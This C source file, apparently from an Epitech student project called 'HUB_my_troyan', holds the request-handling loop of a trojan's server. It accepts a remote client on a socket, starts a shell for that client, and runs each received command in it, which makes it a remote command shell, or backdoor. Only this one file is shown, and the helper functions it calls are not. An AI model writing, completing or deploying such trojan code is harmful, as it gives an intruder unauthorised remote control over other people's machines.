/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 process_request.c
*/

#include "app.h"

static int client_connect(server_t *server)
{
    if (server->client_connected == true) {
        write_in_log(1, "Logout previous client\n");
        logout_user(server);
    }
    if (socket_server_connect(&server->client, server->sock.fd))
        return EXIT_FAILURE;
    server->client_connected = true;
    write_in_log(1, "Client connected\n");
    if (shell_client_init(&server->client, &server->shell))
        return EXIT_FAILURE;
    dprintf(server->client.fd, "Shell started\n");
    return EXIT_SUCCESS;
}

static int process_shell_command(server_t *server)
{
    bool empty = false;
    char *command;

    command = socket_receive(&server->client, &empty);
    if (!command)
        return EXIT_FAILURE;
    write_in_log(3, "> Command received [", command, "]\n");
    send_shell_command(&server->shell, command);
    if (is_logout_command(command)) {
        logout_user(server);
    }
    free(command);
    return EXIT_SUCCESS;
}

int app_process_request(server_t *server)
{
    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        if (process_shell_command(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (client_connect(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
